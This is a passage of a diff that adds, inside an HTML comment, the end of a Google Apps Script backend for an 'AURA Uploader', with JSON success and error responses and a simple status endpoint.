+      return ContentService.createTextOutput(JSON.stringify({status: "success"}))
+        .setMimeType(ContentService.MimeType.JSON);
+    }
+    return ContentService.createTextOutput(JSON.stringify({status: "error"}))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch(err) {
+    return ContentService.createTextOutput(JSON.stringify({status: "error", message: err.toString()}))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet() {
+  return ContentService.createTextOutput("AURA Uploader is running");
+}
+
+----------------- END OF APPS SCRIPT -----------------
+-->
 </body>
 </html>
